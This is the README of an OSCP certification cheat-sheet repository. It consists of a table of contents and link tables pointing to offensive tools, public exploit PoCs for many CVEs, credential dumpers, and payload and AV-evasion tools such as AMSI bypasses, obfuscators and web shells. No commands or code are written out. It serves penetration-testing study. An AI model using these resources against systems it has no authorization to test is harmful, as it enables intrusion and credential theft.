<p align="center">
  <img width="300" height="300" src="https://github.com/0xsyr0/OSCP/blob/main/files/kali_logo.svg">
</p>

# OSCP Cheat Sheet

Commands, Payloads and Resources for the Offensive Security Certified Professional Certification.

Since this little project get's more and more attention, I decided to update it as often as possible to focus more helpful and absolutely necessary commands for the exam. Feel free to submit a pull request or reach out to me on [Twitter](https://twitter.com/syr0_) for suggestions.

Every help or hint is appreciate it!

DISCLAIMER: A guy on Twitter got a point. Automatic exploitation tools like `sqlmap` are prohibited to use in the exam. The same goes for the automatic exploitation functionality of `LinPEAS`. I am not keeping track of current guidelines related to those tools. For that I want to point out that I am not responsible if anybody uses a tool without double checking the latest exam restrictions and fails the exam. Inform yourself before taking the exam!

I removed `sqlmap` because of the reasons above but `Metasploit` is still part of the guide because you can use it for one specific module. Thank you `Muztahidul Tanim` for making me aware and to [Yeeb](https://github.com/Yeeb1) for the resources.

Here are the link to the [OSCP Exam Guide](https://help.offensive-security.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide#exam-restrictions) and the discussion about [LinPEAS](https://www.offensive-security.com/offsec/understanding-pentest-tools-scripts/?hss_channel=tw-134994790). I hope this helps.

## Table of Contents

- [Basics](https://github.com/0xsyr0/OSCP#basics)
- [Information Gathering](https://github.com/0xsyr0/OSCP#information-gathering)
- [Vulnerability Analysis](https://github.com/0xsyr0/OSCP#vulnerability-analysis)
- [Web Application Analysis](https://github.com/0xsyr0/OSCP#web-application-analysis)
- [Password Attacks](https://github.com/0xsyr0/OSCP#password-attacks)
- [Reverse Engineering](https://github.com/0xsyr0/OSCP#reverse-engineering)
- [Exploitation Tools](https://github.com/0xsyr0/OSCP#exploitation-tools)
- [Post Exploitation](https://github.com/0xsyr0/OSCP#post-exploitation)
- [Exploit Databases](https://github.com/0xsyr0/OSCP#exploit-databases)
- [CVEs](https://github.com/0xsyr0/OSCP#cves)
- [Payloads](https://github.com/0xsyr0/OSCP#payloads)
- [Wordlists](https://github.com/0xsyr0/OSCP#wordlists)
- [Social Media Resources](https://github.com/0xsyr0/OSCP#social-media-resources)
- [Commands](https://github.com/0xsyr0/OSCP#commands)
	- [Basics](https://github.com/0xsyr0/OSCP#basics-1)
		- [curl](https://github.com/0xsyr0/OSCP#curl)
		- [Chisel](https://github.com/0xsyr0/OSCP#chisel)
		- [File Transfer](https://github.com/0xsyr0/OSCP#file-transfer)
		- [Kerberos](https://github.com/0xsyr0/OSCP#kerberos)
		- [Ligolo-ng](https://github.com/0xsyr0/OSCP#ligolo-ng)
		- [Linux](https://github.com/0xsyr0/OSCP#linux)
		- [Microsoft Windows](https://github.com/0xsyr0/OSCP#microsoft-windows)
		- [PHP Webserver](https://github.com/0xsyr0/OSCP#php-webserver)
		- [Ping](https://github.com/0xsyr0/OSCP#ping)
		- [Python Webserver](https://github.com/0xsyr0/OSCP#python-webserver)
		- [RDP](https://github.com/0xsyr0/OSCP#rdp)
		- [showmount](https://github.com/0xsyr0/OSCP#showmount)
		- [smbclient](https://github.com/0xsyr0/OSCP#smbclient)
		- [socat](https://github.com/0xsyr0/OSCP#socat)
		- [SSH](https://github.com/0xsyr0/OSCP#ssh)
		- [Time and Date](https://github.com/0xsyr0/OSCP#time-and-date)
		- [Tmux](https://github.com/0xsyr0/OSCP#tmux)
		- [Upgrading Shells](https://github.com/0xsyr0/OSCP#upgrading-shells)
		- [VirtualBox](https://github.com/0xsyr0/OSCP#virtualbox)
		- [virtualenv](https://github.com/0xsyr0/OSCP#virtualenv)
	- [Information Gathering](https://github.com/0xsyr0/OSCP#information-gathering-1)
		- [memcached](https://github.com/0xsyr0/OSCP#memcached)
		- [NetBIOS](https://github.com/0xsyr0/OSCP#netbios)
		- [Nmap](https://github.com/0xsyr0/OSCP#nmap)
		- [Port Scanning](https://github.com/0xsyr0/OSCP#port-scanning)
		- [snmpwalk](https://github.com/0xsyr0/OSCP#snmpwalk)
	- [Web Application Analysis](https://github.com/0xsyr0/OSCP#web-application-analysis-1)
		- [Burp Suite](https://github.com/0xsyr0/OSCP#burp-suite)
		- [Cross-Site Scripting (XSS)](https://github.com/0xsyr0/OSCP#cross-site-scripting-xss)
		- [ffuf](https://github.com/0xsyr0/OSCP#ffuf)
		- [Gobuster](https://github.com/0xsyr0/OSCP#gobuster)
		- [GitTools](https://github.com/0xsyr0/OSCP#gittools)
		- [Local File Inclusion (LFI)](https://github.com/0xsyr0/OSCP#local-file-inclusion-lfi)
		- [PDF PHP Inclusion](https://github.com/0xsyr0/OSCP#pdf-php-inclusion)
		- [PHP Upload Filter Bypasses](https://github.com/0xsyr0/OSCP#php-upload-filter-bypasses)
		- [PHP Filter Chain Generator](https://github.com/0xsyr0/OSCP#php-filter-chain-generator)
		- [PHP Generic Gadget Chains (PHPGGC)](https://github.com/0xsyr0/OSCP#php-generic-gadget-chains-phpgcc)
		- [Server-Side Request Forgery (SSRF)](https://github.com/0xsyr0/OSCP#server-side-request-forgery-ssrf)
		- [Server-Side Template Injection (SSTI)](https://github.com/0xsyr0/OSCP#server-side-template-injection-ssti)
		- [Upload Vulnerabilities](https://github.com/0xsyr0/OSCP#upload-vulnerabilities)
		- [wfuzz](https://github.com/0xsyr0/OSCP#wfuzz)
		- [WPScan](https://github.com/0xsyr0/OSCP#wpscan)
		- [XML External Entity (XXE)](https://github.com/0xsyr0/OSCP#xml-external-entity-xxe)
	- [Database Analysis](https://github.com/0xsyr0/OSCP#database-analysis)
		- [MongoDB](https://github.com/0xsyr0/OSCP#mongodb)
		- [MSSQL](https://github.com/0xsyr0/OSCP#mssql)
		- [MySQL](https://github.com/0xsyr0/OSCP#mysql)
		- [NoSQL Injection](https://github.com/0xsyr0/OSCP#nosql-injection)
		- [PostgreSQL](https://github.com/0xsyr0/OSCP#postgresql)
		- [Redis](https://github.com/0xsyr0/OSCP#redis)
		- [sqlcmd](https://github.com/0xsyr0/OSCP#sqlcmd)
		- [SQL Injection](https://github.com/0xsyr0/OSCP#sql-injection)
		- [SQL Truncation Attack](https://github.com/0xsyr0/OSCP#sql-truncation-attack)
		- [sqlite3](https://github.com/0xsyr0/OSCP#sqlite3)
		- [sqsh](https://github.com/0xsyr0/OSCP#sqsh)
	- [Password Attacks](https://github.com/0xsyr0/OSCP#password-attacks-1)
		- [CrackMapExec](https://github.com/0xsyr0/OSCP#crackmapexec)
		- [fcrack](https://github.com/0xsyr0/OSCP#fcrack)
		- [hashcat](https://github.com/0xsyr0/OSCP#hashcat)
		- [Hydra](https://github.com/0xsyr0/OSCP#hydra)
		- [John](https://github.com/0xsyr0/OSCP#john)
		- [Kerbrute](https://github.com/0xsyr0/OSCP#kerbrute)
		- [LaZagne](https://github.com/0xsyr0/OSCP#lazagne)
		- [mimikatz](https://github.com/0xsyr0/OSCP#mimikatz)
		- [pypykatz](https://github.com/0xsyr0/OSCP#pypykatz)
	- [Exploitation Tools](https://github.com/0xsyr0/OSCP#exploitation-tools-1)
		- [ImageTragick](https://github.com/0xsyr0/OSCP#imagetragick)
		- [MSL / Polyglot Attack](https://github.com/0xsyr0/OSCP#msl--polyglot-attack)
		- [Metasploit](https://github.com/0xsyr0/OSCP#metasploit)
	- [Post Exploitation](https://github.com/0xsyr0/OSCP#post-exploitation-1)
		- [ADCSTemplate](https://github.com/0xsyr0/OSCP#adcstemplate)
		- [BloodHound](https://github.com/0xsyr0/OSCP#bloodhound)
		- [BloodHound Python](https://github.com/0xsyr0/OSCP#bloodhound-python)
		- [Certify](https://github.com/0xsyr0/OSCP#certify)
		- [Certipy](https://github.com/0xsyr0/OSCP#certipy)
		- [enum4linux-ng](https://github.com/0xsyr0/OSCP#enum4linux-ng)
		- [Evil-WinRM](https://github.com/0xsyr0/OSCP#evil-winrm)
		- [Impacket](https://github.com/0xsyr0/OSCP#impacket-1)
		- [JAWS](https://github.com/0xsyr0/OSCP#jaws)
		- [Kerberos](https://github.com/0xsyr0/OSCP#kerberos-1)
		- [ldapsearch](https://github.com/0xsyr0/OSCP#ldapsearch)
		- [Linux](https://github.com/0xsyr0/OSCP#linux-1)
		- [Microsoft Windows](https://github.com/0xsyr0/OSCP#microsoft-windows-1)
		- [PKINITtools](https://github.com/0xsyr0/OSCP#pkinittools)
		- [Port Scanning](https://github.com/0xsyr0/OSCP#port-scanning)
		- [powercat](https://github.com/0xsyr0/OSCP#powercat)
		- [PowerShell](https://github.com/0xsyr0/OSCP#powershell)
		- [pwncat](https://github.com/0xsyr0/OSCP#pwncat)
		- [rpcclient](https://github.com/0xsyr0/OSCP#rpcclient)
		- [Rubeus](https://github.com/0xsyr0/OSCP#rubeus)
		- [RunasCs](https://github.com/0xsyr0/OSCP#runascs)
		- [winexe](https://github.com/0xsyr0/OSCP#winexe)
	- [CVE](https://github.com/0xsyr0/OSCP#cve)
		- [CVE-2014-6271: Shellshock RCE PoC](https://github.com/0xsyr0/OSCP#cve-2014-6271-shellshock-rce-poc)
		- [CVE-2016-1531: exim LPE](https://github.com/0xsyr0/OSCP#cve-2016-1531-exim-lpe)
		- [CVE-2019-14287: Sudo Bypass](https://github.com/0xsyr0/OSCP#cve-2019-14287-sudo-bypass)
		- [CVE-2020-1472: ZeroLogon PE](https://github.com/0xsyr0/OSCP#cve-2020-1472-zerologon-pe)
		- [CVE-2021–3156: Sudo / sudoedit LPE](https://github.com/0xsyr0/OSCP#cve-2021-3156-sudo--sudoedit-lpe)
		- [CVE-2021-44228: Log4Shell RCE (0-day)](https://github.com/0xsyr0/OSCP#cve-2021-44228-log4shell-rce-0-day)
		- [CVE-2022-0847: Dirty Pipe LPE](https://github.com/0xsyr0/OSCP#cve-2022-0847-dirty-pipe-lpe)
		- [CVE-2022-22963: Spring4Shell RCE (0-day)](https://github.com/0xsyr0/OSCP#cve-2022-22963-spring4shell-rce-0-day)
		- [CVE-2022-30190: MS-MSDT Follina RCE](https://github.com/0xsyr0/OSCP#cve-2022-30190-ms-msdt-follina-rce)
		- [CVE-2022-31214: Firejail LPE](https://github.com/0xsyr0/OSCP#cve-2022-31214-firejail-lpe)
		- [CVE-2023-21746: Windows NTLM EoP LocalPotato LPE](https://github.com/0xsyr0/OSCP#cve-2023-21746-windows-ntlm-eop-localpotato-lpe)
		- [CVE-2023-22809: Sudo Bypass](https://github.com/0xsyr0/OSCP#cve-2023-22809-sudo-bypass)
		- [CVE-2023-23397: Microsoft Outlook (Click-to-Run) PE (0-day) (PowerShell Implementation)](https://github.com/0xsyr0/OSCP#cve-2023-23397-microsoft-outlook-click-to-run-pe-0-day-powershell-implementation)
		- [Juicy Potato LPE](https://github.com/0xsyr0/OSCP#juicy-potato-lpe)
		- [MySQL 4.x/5.0 User-Defined Function (UDF) Dynamic Library (2) LPE](https://github.com/0xsyr0/OSCP#mysql-4x50-user-defined-function-udf-dynamic-library-2-lpe)
		- [SharpEfsPotato LPE](https://github.com/0xsyr0/OSCP#sharpefspotato-lpe)
		- [Shocker Container Escape](https://github.com/0xsyr0/OSCP#shocker-container-escape)
	- [Payloads](https://github.com/0xsyr0/OSCP#payloads-1)
		- [Donut](https://github.com/0xsyr0/OSCP#donut)
		- [Exiftool](https://github.com/0xsyr0/OSCP#exiftool)
		- [GhostScript](https://github.com/0xsyr0/OSCP#ghostscript)
		- [nishang](https://github.com/0xsyr0/OSCP#nishang)
		- [Reverse Shells](https://github.com/0xsyr0/OSCP#reverse-shells)
		- [ScareCrow](https://github.com/0xsyr0/OSCP#scarecrow)
		- [Shikata Ga Nai](https://github.com/0xsyr0/OSCP#shikata-ga-nai)
		- [Web Shells](https://github.com/0xsyr0/OSCP#web-shells)
		- [ysoserial](https://github.com/0xsyr0/OSCP#ysoserial)
	- [Templates](https://github.com/0xsyr0/OSCP#templates)
		- [ASPX Web Shell](https://github.com/0xsyr0/OSCP#aspx-web-shell)
		- [Bad YAML](https://github.com/0xsyr0/OSCP#bad-yaml)
		- [Exploit Skeleton Python Script](https://github.com/0xsyr0/OSCP#exploit-skeleton-python-script)
		- [JSON POST Rrequest](https://github.com/0xsyr0/OSCP#json-post-request)
		- [Python Pickle RCE](https://github.com/0xsyr0/OSCP#python-pickle-rce)
		- [Python Redirect for SSRF](https://github.com/0xsyr0/OSCP#python-redirect-for-ssrf)
		- [Python Web Request](https://github.com/0xsyr0/OSCP#python-web-request)
		- [XML External Entity (XXE)](https://github.com/0xsyr0/OSCP#xml-external-entity-xxe)

### Basics

| Name | URL |
| --- | --- |
| Chisel | https://github.com/jpillora/chisel |
| CyberChef | https://gchq.github.io/CyberChef |
| Swaks | https://github.com/jetmore/swaks |

### Information Gathering

| Name | URL |
| --- | --- |
| Nmap | https://github.com/nmap/nmap |

### Vulnerability Analysis

| Name | URL |
| --- | --- |
| nikto | https://github.com/sullo/nikto |
| Sparta | https://github.com/SECFORCE/sparta |

### Web Application Analysis

| Name | URL |
| --- | --- |
| ffuf | https://github.com/ffuf/ffuf |
| fpmvuln | https://github.com/hannob/fpmvuln |
| Gobuster | https://github.com/OJ/gobuster |
| httpx | https://github.com/projectdiscovery/httpx |
| JSON Web Tokens | https://jwt.io |
| JWT_Tool | https://github.com/ticarpi/jwt_tool |
| Leaky Paths | https://github.com/ayoubfathi/leaky-paths |
| PayloadsAllTheThings | https://github.com/swisskyrepo/PayloadsAllTheThings |
| PHP Filter Chain Generator | https://github.com/synacktiv/php_filter_chain_generator |
| PHPGGC | https://github.com/ambionics/phpggc |
| SSRF testing resources | https://github.com/cujanovic/SSRF-Testing |
| Weird Proxies | https://github.com/GrrrDog/weird_proxies |
| Wfuzz | https://github.com/xmendez/wfuzz |
| WhatWeb | https://github.com/urbanadventurer/WhatWeb |
| WPScan | https://github.com/wpscanteam/wpscan |
| ysoserial | https://github.com/frohoff/ysoserial |

### Password Attacks

| Name | URL |
| --- | --- |
| CrackMapExec | https://github.com/byt3bl33d3r/CrackMapExec |
| Default Credentials Cheat Sheet | https://github.com/ihebski/DefaultCreds-cheat-sheet |
| hashcat | https://hashcat.net/hashcat |
| Hydra | https://github.com/vanhauser-thc/thc-hydra |
| John | https://github.com/openwall/john |
| Kerbrute | https://github.com/ropnop/kerbrute |
| LaZagne | https://github.com/AlessandroZ/LaZagne |
| mimikatz | https://github.com/gentilkiwi/mimikatz |
| Patator | https://github.com/lanjelot/patator |
| pypykatz | https://github.com/skelsec/pypykatz |
| RsaCtfTool | https://github.com/Ganapati/RsaCtfTool |
| SprayingToolkit | https://github.com/byt3bl33d3r/SprayingToolkit |

### Reverse Engineering

| Name | URL |
| --- | --- |
| AvalonialLSpy | https://github.com/icsharpcode/AvaloniaILSpy |
| binwalk | https://github.com/ReFirmLabs/binwalk |
| cutter | https://github.com/rizinorg/cutter |
| dnSpy | https://github.com/dnSpy/dnSpy |
| GEF | https://github.com/hugsy/gef |
| ghidra | https://github.com/NationalSecurityAgency/ghidra |
| ImHex | https://github.com/WerWolv/ImHex |
| JD-GUI | https://github.com/java-decompiler/jd-gui |
| peda | https://github.com/longld/peda |
| pwndbg | https://github.com/pwndbg/pwndbg |
| Radare2 | https://github.com/radareorg/radare2 |

### Exploitation Tools

| Name | URL |
| --- | --- |
| Evil-WinRM | https://github.com/Hackplayers/evil-winrm |
| ImageTragick | https://imagetragick.com |
| Metasploit | https://github.com/rapid7/metasploit-framework |
| MSL / Polyglot Attack | https://insert-script.blogspot.com/2020/11/imagemagick-shell-injection-via-pdf.html |

### Post Exploitation

| Name | URL |
| --- | --- |
| ADCSKiller - An ADCS Exploitation Automation Tool | https://github.com/grimlockx/ADCSKiller |
| ADCSTemplate | https://github.com/GoateePFE/ADCSTemplate |
| BloodHound Docker | https://github.com/belane/docker-bloodhound |
| BloodHound | https://github.com/BloodHoundAD/BloodHound |
| BloodHound | https://github.com/ly4k/BloodHound |
| BloodHound Python | https://github.com/fox-it/BloodHound.py |
| Certify | https://github.com/GhostPack/Certify |
| Certipy | https://github.com/ly4k/Certipy |
| enum4linux-ng | https://github.com/cddmp/enum4linux-ng |
| Ghostpack-CompiledBinaries | https://github.com/r3motecontrol/Ghostpack-CompiledBinaries |
| GTFOBins | https://gtfobins.github.io |
| Impacket | https://github.com/fortra/impacket |
| Impacket Static Binaries | https://github.com/ropnop/impacket_static_binaries |
| JAWS | https://github.com/411Hall/JAWS |
| KrbRelay | https://github.com/cube0x0/KrbRelay |
| KrbRelayUp | https://github.com/Dec0ne/KrbRelayUp |
| Krbrelayx | https://github.com/dirkjanm/krbrelayx |
| LAPSDumper | https://github.com/n00py/LAPSDumper |
| LinEnum | https://github.com/rebootuser/LinEnum |
| LOLBAS | https://lolbas-project.github.io |
| lsassy | https://github.com/Hackndo/lsassy |
| nanodump | https://github.com/helpsystems/nanodump |
| PassTheCert | https://github.com/AlmondOffSec/PassTheCert |
| PEASS-ng | https://github.com/carlospolop/PEASS-ng |
| PKINITtools | https://github.com/dirkjanm/PKINITtools |
| powercat | https://github.com/besimorhino/powercat |
| PowerSharpPack | https://github.com/S3cur3Th1sSh1t/PowerSharpPack |
| PowerUp | https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1 |
| PowerView | https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1 |
| PowerView.py | https://github.com/aniqfakhrul/powerview.py |
| PPLdump | https://github.com/itm4n/PPLdump |
| Priv2Admin | https://github.com/gtworek/Priv2Admin |
| PSPKIAudit | https://github.com/GhostPack/PSPKIAudit |
| pspy | https://github.com/DominicBreuker/pspy |
| pth-toolkit | https://github.com/byt3bl33d3r/pth-toolkit |
| pwncat | https://github.com/calebstewart/pwncat |
| PyWhisker | https://github.com/ShutdownRepo/pywhisker |
| Rubeus | https://github.com/GhostPack/Rubeus |
| RunasCs | https://github.com/antonioCoco/RunasCs |
| RustHound | https://github.com/OPENCYBER-FR/RustHound |
| scavenger | https://github.com/SpiderLabs/scavenger |
| SharpCollection | https://github.com/Flangvik/SharpCollection |
| SharpHound | https://github.com/BloodHoundAD/SharpHound |
| SharpView | https://github.com/tevora-threat/SharpView |
| Sherlock | https://github.com/rasta-mouse/Sherlock |
| Villain | https://github.com/t3l3machus/Villain |
| WADComs | https://wadcoms.github.io |
| Watson | https://github.com/rasta-mouse/Watson |
| WESNG | https://github.com/bitsadmin/wesng
| Whisker | https://github.com/eladshamir/Whisker |
| Windows-privesc-check | https://github.com/pentestmonkey/windows-privesc-check |
| Windows Privilege Escalation Fundamentals | https://www.fuzzysecurity.com/tutorials/16.html |
| Windows Privilege Escalation | https://github.com/frizb/Windows-Privilege-Escalation |

### Exploit Databases

| Database | URL |
| --- | --- |
| 0day.today Exploit Database | https://0day.today |
| Exploit Database | https://www.exploit-db.com |
| Packet Storm | https://packetstormsecurity.com |
| Sploitus | https://sploitus.com |

### CVEs

| CVE | Descritpion | URL |
| --- | --- | --- |
| CVE-2014-6271 | Shocker RCE | https://github.com/nccgroup/shocker |
| CVE-2014-6271 | Shellshock RCE PoC | https://github.com/zalalov/CVE-2014-6271 |
| CVE-2014-6271 | Shellshocker RCE POCs | https://github.com/mubix/shellshocker-pocs |
| CVE-2016-5195 | Dirty COW LPE | https://github.com/firefart/dirtycow |
| CVE-2017-0199 | RTF Dynamite RCE | https://github.com/bhdresh/CVE-2017-0199 |
| CVE-2018-10933 | libSSH Authentication Bypass | https://github.com/blacknbunny/CVE-2018-10933 |
| CVE-2018-16509 | Ghostscript PIL RCE | https://github.com/farisv/PIL-RCE-Ghostscript-CVE-2018-16509 |
| CVE-2019-14287 | Sudo Bypass LPE | https://github.com/n0w4n/CVE-2019-14287 |
| CVE-2019-18634 | Sudo Buffer Overflow LPE | https://github.com/saleemrashid/sudo-cve-2019-18634 |
| CVE-2019-5736 | RunC Container Escape PoC | https://github.com/Frichetten/CVE-2019-5736-PoC |
| CVE-2019-6447 | ES File Explorer Open Port Arbitrary File Read | https://github.com/fs0c131y/ESFileExplorerOpenPortVuln |
| CVE-2019-7304 | dirty_sock LPE | https://github.com/initstring/dirty_sock |
| CVE-2020-0796 | SMBGhost RCE PoC | https://github.com/chompie1337/SMBGhost_RCE_PoC |
| CVE-2020-1472 | ZeroLogon PE Checker & Exploitation Code | https://github.com/VoidSec/CVE-2020-1472 |
| CVE-2020-1472 | ZeroLogon PE Exploitation Script | https://github.com/risksense/zerologon |
| CVE-2020-1472 | ZeroLogon PE PoC | https://github.com/dirkjanm/CVE-2020-1472 |
| CVE-2020-1472 | ZeroLogon PE Testing Script | https://github.com/SecuraBV/CVE-2020-1472 |
| CVE-2021-1675,CVE-2021-34527 | PrintNightmare LPE RCE | https://github.com/nemo-wq/PrintNightmare-CVE-2021-34527 |
| CVE-2021-1675 | PrintNightmare LPE RCE (PowerShell Implementation) | https://github.com/calebstewart/CVE-2021-1675 |
| CVE-2021-21972 | vCenter RCE | https://github.com/horizon3ai/CVE-2021-21972 |
| CVE-2021-22204 | GitLab Exiftool RCE | https://github.com/CsEnox/Gitlab-Exiftool-RCE |
| CVE-2021-22204 | GitLab Exiftool RCE (Python Implementation) | https://github.com/convisolabs/CVE-2021-22204-exiftool |
| CVE-2021-26085 | Confluence Server RCE | https://github.com/Phuong39/CVE-2021-26085 |
| CVE-2021-27928 | MariaDB/MySQL wsrep provider RCE | https://github.com/Al1ex/CVE-2021-27928 |
| CVE-2021-3129 | Laravel Framework RCE | https://github.com/nth347/CVE-2021-3129_exploit |
| CVE-2021-3156 | Sudo / sudoedit LPE  | https://github.com/mohinparamasivam/Sudo-1.8.31-Root-Exploit |
| CVE-2021-3156 | Sudo / sudoedit LPE PoC | https://github.com/blasty/CVE-2021-3156 |
| CVE-2021-3560 | polkit LPE (C Implementation) | https://github.com/hakivvi/CVE-2021-3560 |
| CVE-2021-3560 | polkit LPE | https://github.com/Almorabea/Polkit-exploit |
| CVE-2021-3560 | polkit LPE PoC | https://github.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation |
| CVE-2021-36934 | HiveNightmare LPE | https://github.com/GossiTheDog/HiveNightmare |
| CVE-2021-36942 | PetitPotam | https://github.com/topotam/PetitPotam |
| CVE-2021-36942 | DFSCoerce | https://github.com/Wh04m1001/DFSCoerce |
| CVE-2021-4034 | PwnKit Pkexec Self-contained Exploit LPE | https://github.com/ly4k/PwnKit |
| CVE-2021-4034 | PwnKit Pkexec LPE PoC (1) | https://github.com/dzonerzy/poc-cve-2021-4034 |
| CVE-2021-4034 | PwnKit Pkexec LPE PoC (2) | https://github.com/arthepsy/CVE-2021-4034 |
| CVE-2021-4034 | PwnKit Pkexec LPE PoC (3) | https://github.com/nikaiw/CVE-2021-4034 |
| CVE-2021-40444 | MSHTML builders RCE | https://github.com/aslitsecurity/CVE-2021-40444_builders |
| CVE-2021-40444 | MSHTML Exploit RCE | https://xret2pwn.github.io/CVE-2021-40444-Analysis-and-Exploit/ |
| CVE-2021-40444 | MSHTML RCE PoC | https://github.com/lockedbyte/CVE-2021-40444 |
| CVE-2021-41379 | InstallerFileTakeOver LPE (0-day) (Archive) | https://github.com/klinix5/InstallerFileTakeOver |
| CVE-2021-41379 | InstallerFileTakeOver LPE (0-day) (Fork) | https://github.com/waltlin/CVE-2021-41379-With-Public-Exploit-Lets-You-Become-An-Admin-InstallerFileTakeOver |
| CVE-2021-41773,CVE-2021-42013, CVE-2020-17519 | Simples Apache Path Traversal (0-day) | https://github.com/MrCl0wnLab/SimplesApachePathTraversal |
| CVE-2021-42278,CVE-2021-42287 | sam-the-admin, sAMAccountName Spoofing / Domain Admin Impersonation PE | https://github.com/WazeHell/sam-the-admin |
| CVE-2021-42278 | sam-the-admin, sAMAccountName Spoofing / Domain Admin Impersonation PE (Python Implementation) | https://github.com/ly4k/Pachine |
| CVE-2021-42287,CVE-2021-42278 | noPac LPE (1) | https://github.com/cube0x0/noPac |
| CVE-2021-42287,CVE-2021-42278 | noPac LPE (2) | https://github.com/Ridter/noPac |
| CVE-2021-42321 | Microsoft Exchange Server RCE | https://gist.github.com/testanull/0188c1ae847f37a70fe536123d14f398 |
| CVE-2021-44228 | Log4Shell RCE (0-day) | https://github.com/kozmer/log4j-shell-poc |
| CVE-2022-0847 | DirtyPipe-Exploits LPE | https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits |
| CVE-2022-21999 | SpoolFool, Windows Print Spooler LPE | https://github.com/ly4k/SpoolFool |
| CVE-2022-22963 | Spring4Shell RCE (0-day) | https://github.com/tweedge/springcore-0day-en |
| CVE-2022-23119,CVE-2022-23120 | Trend Micro Deep Security Agent for Linux Arbitrary File Read | https://github.com/modzero/MZ-21-02-Trendmicro |
| CVE-2022-24715 | Icinga Web 2 Authenticated Remote Code Execution RCE | https://github.com/JacobEbben/CVE-2022-24715 |
| CVE-2022-26134 | ConfluentPwn RCE (0-day) | https://github.com/redhuntlabs/ConfluentPwn |
| CVE-2022-30190 | MS-MSDT Follina Attack Vector RCE | https://github.com/JohnHammond/msdt-follina |
| CVE-2022-30190 | MS-MSDT Follina RCE PoC | https://github.com/onecloudemoji/CVE-2022-30190 |
| CVE-2022-30190 | MS-MSDT Follina RCE (Python Implementation) | https://github.com/chvancooten/follina.py |
| CVE-2022-31214 | Firejail / Firejoin LPE | https://github.com/netblue30/firejail |
| CVE-2022-31214 | Firejail / Firejoin LPE | https://seclists.org/oss-sec/2022/q2/188 |
| CVE-2022-31214 | Firejail / Firejoin LPE | https://www.openwall.com/lists/oss-security/2022/06/08/10 |
| CVE-2022-34918 | Netfilter Kernel Exploit LPE | https://github.com/randorisec/CVE-2022-34918-LPE-PoC |
| CVE-2023-21716 | CVE-2023-21716: Microsoft Word RTF Font Table Heap Corruption RCE PoC (Python Implementation) | https://github.com/Xnuvers007/CVE-2023-21716 |
| CVE-2023-21746 | Windows NTLM EoP LocalPotato LPE | https://github.com/decoder-it/LocalPotato |
| CVE-2023-21768 | Windows Ancillary Function Driver for WinSock LPE POC | https://github.com/chompie1337/Windows_LPE_AFD_CVE-2023-21768 |
| CVE-2023-21817 | Kerberos Unlock LPE PoC | https://gist.github.com/monoxgas/f615514fb51ebb55a7229f3cf79cf95b |
| CVE-2023-22809 | sudoedit LPE | https://github.com/n3m1dotsys/CVE-2023-22809-sudoedit-privesc |
| CVE-2023-23397 | Microsoft Outlook (Click-to-Run) PE (0-day) | https://github.com/sqrtZeroKnowledge/CVE-2023-23397_EXPLOIT_0DAY |
| CVE-2023-23397 | Microsoft Outlook (Click-to-Run) PE (0-day) (PowerShell Implementation) | https://github.com/api0cradle/CVE-2023-23397-POC-Powershell |
| CVE-2023-23397 | Microsoft Outlook (Click-to-Run) PE (0-day) (Python Implementation) | https://github.com/Trackflaw/CVE-2023-23397 |
| CVE-2023-28879 | Shell in the Ghost: Ghostscript RCE PoC | https://github.com/AlmondOffSec/PoCs/tree/master/Ghostscript_rce |
| n/a | dompdf RCE (0-day) | https://github.com/positive-security/dompdf-rce |
| n/a | dompdf XSS to RCE (0-day) | https://positive.security/blog/dompdf-rce |
| n/a | StorSvc LPE | https://github.com/blackarrowsec/redteam-research/tree/master/LPE%20via%20StorSvc |
| n/a | GenericPotato LPE | https://github.com/micahvandeusen/GenericPotato |
| n/a | GodPotato LPE | https://github.com/BeichenDream/GodPotato |
| n/a | JuicyPotato LPE | https://github.com/ohpe/juicy-potato |
| n/a | Juice-PotatoNG LPE | https://github.com/antonioCoco/JuicyPotatoNG |
| n/a | MultiPotato LPE | https://github.com/S3cur3Th1sSh1t/MultiPotato |
| n/a | RemotePotato0 PE | https://github.com/antonioCoco/RemotePotato0 |
| n/a | RoguePotato LPE | https://github.com/antonioCoco/RoguePotato |
| n/a | RottenPotatoNG LPE | https://github.com/breenmachine/RottenPotatoNG |
| n/a | SharpEfsPotato LPE | https://github.com/bugch3ck/SharpEfsPotato |
| n/a | SweetPotato LPE | https://github.com/CCob/SweetPotato |
| n/a | PrintSpoofer LPE (1) | https://github.com/dievus/printspoofer |
| n/a | PrintSpoofer LPE (2) | https://github.com/itm4n/PrintSpoofer |
| n/a | Shocker Container Escape | https://github.com/gabrtv/shocker |
| n/a | SystemNightmare PE | https://github.com/GossiTheDog/SystemNightmare |
| n/a | OfflineSAM LPE | https://github.com/gtworek/PSBits/tree/master/OfflineSAM |
| n/a | OfflineAddAdmin2 LPE | https://github.com/gtworek/PSBits/tree/master/OfflineSAM/OfflineAddAdmin2 |
| n/a | Kernelhub | https://github.com/Ascotbe/Kernelhub |
| n/a | Windows Exploits | https://github.com/SecWiki/windows-kernel-exploits |
| n/a | Pre-compiled Windows Exploits | https://github.com/abatchy17/WindowsExploits |

### Payloads

| Name | URL |
| --- | --- |
| AMSI.fail | http://amsi.fail |
| Donut | https://github.com/TheWover/donut |
| Freeze | https://github.com/optiv/Freeze |
| hoaxshell | https://github.com/t3l3machus/hoaxshell |
| Invoke-Obfuscation | https://github.com/danielbohannon/Invoke-Obfuscation |
| marshalsec | https://github.com/mbechler/marshalsec |
| nishang | https://github.com/samratashok/nishang |
| Payload Box | https://github.com/payloadbox |
| PayloadsAllTheThings | https://github.com/swisskyrepo/PayloadsAllTheThings |
| phpgcc | https://github.com/ambionics/phpggc |
| PHP-Reverse-Shell | https://github.com/ivan-sincek/php-reverse-shell|
| PowerLine | https://github.com/fullmetalcache/powerline |
| PowerShell Encoder (CyberChef) | [Receipe for encoding PowerShell Payloads for Windows](https://cyberchef.io/#recipe=Encode_text('UTF-16LE%20(1200)')To_Base64('A-Za-z0-9%2B/%3D')) |
| Raikia's Hub Powershell Encoder | https://raikia.com/tool-powershell-encoder/ |
| ScareCrow | https://github.com/optiv/ScareCrow |
| Shikata Ga Nai | https://github.com/EgeBalci/sgn |
| unicorn | https://github.com/trustedsec/unicorn |
| Veil | https://github.com/Veil-Framework/Veil |
| webshell | https://github.com/tennc/webshell |
| Web-Shells | https://github.com/TheBinitGhimire/Web-Shells |
